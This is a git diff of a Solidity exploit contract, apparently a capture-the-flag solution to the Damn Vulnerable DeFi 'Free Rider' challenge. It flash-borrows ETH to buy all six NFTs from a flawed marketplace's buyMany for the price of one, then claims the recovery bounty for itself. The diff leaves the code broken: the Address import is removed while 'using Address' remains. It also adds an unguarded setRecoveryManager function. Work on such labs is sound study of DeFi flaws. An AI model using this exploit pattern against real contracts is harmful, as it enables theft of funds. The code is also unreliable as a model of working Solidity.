@@ -6,25 +6,24 @@ import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156
 import {FreeRiderNFTMarketplace} from "../src/FreeRiderNFTMarketplace.sol";
 import {FreeRiderRecoveryManager} from "../src/FreeRiderRecoveryManager.sol";
 import {DamnValuableNFT} from "../src/DamnValuableNFT.sol";
-import {Address} from "@openzeppelin/contracts/utils/Address.sol";
+import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
 
 contract Resolver is IERC721Receiver, IERC3156FlashBorrower {
     using Address for address payable;
-
     FreeRiderNFTMarketplace public marketpalace;
     FreeRiderRecoveryManager public recoveryManager;
     DamnValuableNFT public nft;
-    address public immutable beneficiary;
 
-    constructor(
-        FreeRiderNFTMarketplace _marketPlace,
-        FreeRiderRecoveryManager _recoveryManager,
-        address _beneficiary
-    ) {
+    constructor(FreeRiderNFTMarketplace _marketPlace) {
         marketpalace = _marketPlace;
-        recoveryManager = _recoveryManager;
-        beneficiary = _beneficiary;
         nft = marketpalace.token();
+    }
+
+    function setRecoveryManager(
+        FreeRiderRecoveryManager _recoveryManager
+    ) external {
+        require(address(recoveryManager) == address(0), "already-set");
+        recoveryManager = _recoveryManager;
     }
 
     function onFlashLoan(
@@ -40,13 +39,11 @@ contract Resolver is IERC721Receiver, IERC3156FlashBorrower {
             tokenIds[i] = i;
         }
 
-        // Exploit buyMany using only amount ETH
         marketpalace.buyMany{value: amount}(tokenIds);
-
-        // Send NFTs to recovery manager
-
         for (uint256 i = 0; i < 6; i++) {
-            bytes memory data = i == 5 ? abi.encode(beneficiary) : new bytes(0);
+            bytes memory data = i == 5
+                ? abi.encode(address(this))
+                : new bytes(0);
             nft.safeTransferFrom(
                 address(this),
                 address(recoveryManager),
@@ -56,8 +53,8 @@ contract Resolver is IERC721Receiver, IERC3156FlashBorrower {
         }
 
         // Repay flash loan
-        
-        payable(msg.sender).sendValue(amount);
+
+        SafeTransferLib.safeTransferETH(msg.sender, amount); // optimized one , Recommended
 
         return keccak256("ERC3156FlashBorrower.onFlashLoan");
     }
